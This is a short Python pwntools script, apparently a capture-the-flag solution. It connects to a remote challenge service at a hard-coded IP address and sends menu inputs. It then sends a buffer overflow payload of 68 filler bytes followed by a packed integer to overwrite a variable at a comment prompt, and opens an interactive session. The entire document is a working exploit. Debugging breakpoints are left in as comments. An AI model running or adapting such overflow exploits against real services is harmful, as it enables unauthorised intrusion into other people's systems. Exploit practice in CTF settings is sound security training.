from pwn import *
context.log_level = 'debug'
context.arch = "amd64"

e = context.binary = ELF('chal')
# r= e.process()
r = remote('34.70.212.151', 8004)
# lib = e.libc
# ld = ELF('ld-linux-x86-64.so.2')
# lib= ELF('libc6_2.35-0ubuntu3_amd64.so')

# gdb.attach(r, '''
    # b*hint+56
    # si
# ''')

r.sendline(b"1")
r.sendline(b"1")
payload = b"a"*68+p32(100)

# gdb.attach(r, '''
    # b*main+307
    # c
# ''')
pause()
r.sendlineafter(b"Any Comments ?", payload)


r.interactive()
